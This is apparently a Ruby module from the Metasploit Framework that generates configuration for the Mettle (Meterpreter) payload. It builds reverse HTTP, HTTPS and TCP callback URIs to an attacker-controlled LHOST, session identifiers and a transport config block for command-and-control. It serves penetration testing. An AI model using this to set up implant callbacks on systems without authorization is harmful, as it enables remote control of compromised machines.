# -*- coding: binary -*-

require 'base64'
require 'securerandom'

module Msf
  module Sessions
    module MettleConfig
      include Msf::Payload::TransportConfig

      def initialize(info = {})
        super

        register_advanced_options(
          [
            OptBool.new(
              'MeterpreterTryToFork',
              'Fork a new process if the functionality is available',
              default: false
            ),
          ]
        )
        unless staged?
          register_advanced_options(
            [
              OptEnum.new(
                'PayloadLinuxMinKernel',
                [true, 'Linux minimum kernel version for compatibility', '2.6', ['2.6', '3.17']]
              )
            ]
          )
        end
      end

      def generate_uri(opts = {})
        ds = opts[:datastore] || datastore
        uri_req_len = ds['StagerURILength'].to_i

        # Choose a random URI length between 30 and 128 bytes
        if uri_req_len == 0
          uri_req_len = 30 + luri.length + rand(127 - (30 + luri.length))
        end

        if uri_req_len < 5
          raise ArgumentError, 'Minimum StagerURILength is 5'
        end

        generate_uri_uuid_mode(:init_connect, uri_req_len, uuid: opts[:uuid])
      end

      def generate_uri_option(opts, opt)
        opts[opt] ? "--#{opt} '#{opts[opt].gsub('\'', "\\'")}' " : ''
      end

      def generate_http_uri(opts)
        if Rex::Socket.is_ipv6?(opts[:lhost])
          target_uri = "#{opts[:scheme]}://[#{opts[:lhost]}]"
        else
          target_uri = "#{opts[:scheme]}://#{opts[:lhost]}"
        end

        target_uri << ':'
        target_uri << opts[:lport].to_s
        target_uri << luri
        target_uri << generate_uri(opts)
        target_uri << '|'
        target_uri << generate_uri_option(opts, :ua)
        target_uri << generate_uri_option(opts, :host)
        target_uri << generate_uri_option(opts, :referer)
        if opts[:cookie]
          opts[:header] = "Cookie: #{opts[:cookie]}"
          target_uri << generate_uri_option(opts, :header)
        end
        target_uri.strip
      end

      def generate_tcp_uri(opts)
        if Rex::Socket.is_ipv6?(opts[:lhost])
          target_uri = "#{opts[:scheme]}://[#{opts[:lhost]}]"
        else
          target_uri = "#{opts[:scheme]}://#{opts[:lhost]}"
        end
        target_uri << ':'
        target_uri << opts[:lport].to_s
        target_uri
      end

      def generate_config(opts = {})
        ds = opts[:datastore] || datastore

        opts[:background] = ds['MeterpreterTryToFork'] ? 1 : 0

        if ds['PayloadProcessCommandLine'] != ''
          opts[:name] ||= ds['PayloadProcessCommandLine']
        end

        opts[:uuid] ||= generate_payload_uuid

        unless opts[:transport_config]
          if opts[:stageless] == true
            case opts[:scheme]
            when 'http'
              opts[:transport_config] = [transport_config_reverse_http(opts)]
            when 'https'
              opts[:transport_config] = [transport_config_reverse_https(opts)]
            when 'tcp'
              opts[:transport_config] = [transport_config_reverse_tcp(opts)]
            else
              raise ArgumentError, "Unknown scheme: #{opts[:scheme]}"
            end
          else
            # Staged payloads inherit the stager's socket (fd transport);
            # the stage must not synthesise its own C2 transport. Use an
            # explicit empty array ([] is truthy, so the build is skipped).
            opts[:transport_config] = []
          end
        end

        # Generate the TLV config block
        config_opts = {
          ascii_str:         true,
          null_session_guid: opts[:stageless] == true,
          expiration:        (ds[:expiration] || ds['SessionExpirationTimeout']).to_i,
          uuid:              opts[:uuid],
          transports:        opts[:transport_config],
          stageless:         opts[:stageless] == true,
        }.merge(meterpreter_logging_config(opts))

        config = Rex::Payloads::Meterpreter::Config.new(config_opts)
        opts[:config_block] = config.to_b

        # Keep the legacy CLI config for backward compatibility during
        # transition. Skipped for staged payloads, which have no transport.
        transport = opts[:transport_config].first
        if transport
          case opts[:scheme]
          when 'http', 'https'
            opts[:uri] = generate_http_uri(transport)
          when 'tcp'
            opts[:uri] = generate_tcp_uri(transport)
          end
        end

        opts[:uuid] = Base64.encode64(opts[:uuid].to_raw).strip
        guid = "\x00" * 16
        unless opts[:stageless] == true
          guid = [SecureRandom.uuid.gsub('-', '')].pack('H*')
        end
        opts[:session_guid] = Base64.encode64(guid).strip

        opts.slice(:uuid, :session_guid, :uri, :debug, :log_file, :name, :background, :config_block)
      end

      # Stage encoding is not safe for Mettle (doesn't apply to stageless)
      def encode_stage?
        if datastore['EnableStageEncoding'] && !@warned
          print_warning("Stage encoding is not supported for #{refname}")
          @warned = true
        end

        false
      end
    end
  end
end
